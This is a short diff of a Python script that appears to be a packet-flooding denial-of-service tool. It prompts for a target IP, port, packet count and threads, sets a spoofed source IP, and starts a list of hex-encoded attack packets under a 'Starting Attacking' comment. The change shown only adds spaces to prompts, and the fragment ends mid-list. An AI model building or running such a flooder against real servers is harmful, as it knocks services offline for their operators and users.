@@ -25,11 +25,11 @@ url_chek = requests.get(url)
 ip = socket.gethostbyname(url.replace("https://","").replace("http://",""))
 print(ip)
 print()
-ip = str(input("\033[94m[+] IP target \033[1;31;40m  ==> : \033[0m"))
+ip = str(input(" \033[94m[+] IP target \033[1;31;40m  ==> : \033[0m"))
 port = int(input(" \033[94m[+] Port Target \033[1;31;40m ==> : \033[0m"))
 choice = str(input(" \033[94m[+] ARE YOU READY? (Y/N) \033[1;31;40m  ==> : \033[0m"))
 times = int(input(" \033[94m[+] INPUT PACKET \033[1;31;40m  ==> : \033[0m"))
-threads = int(input("\033[94m[+] INPUT THREADS \033[1;31;40m  ==> : \033[0m"))
+threads = int(input(" \033[94m[+] INPUT THREADS \033[1;31;40m  ==> : \033[0m"))
 fake_ip = '182.21.20.32'
 #Starting Attacking
 Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
